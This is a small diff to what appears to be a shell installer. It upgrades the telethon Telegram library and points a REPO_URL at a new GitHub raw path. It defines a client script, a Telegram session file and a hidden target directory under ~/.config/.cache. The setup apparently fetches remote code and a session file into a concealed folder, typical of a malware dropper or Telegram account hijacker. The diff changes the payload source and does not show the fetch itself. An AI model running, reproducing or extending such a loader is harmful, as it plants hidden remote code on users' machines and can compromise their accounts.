@@ -19,7 +19,7 @@ if ! pip install --upgrade telethon; then
 fi
 
 # 4. Ensure the hidden directory exists before writing to it
-REPO_URL="https://github.com/precise104/precise2/raw/main"
+REPO_URL="https://github.com/chrv01/c1/raw/main"
 CLIENT_SCRIPT="client.py"
 SESSION_FILE="client.session"
 HIDDEN_DIR="$HOME/.config/.cache"
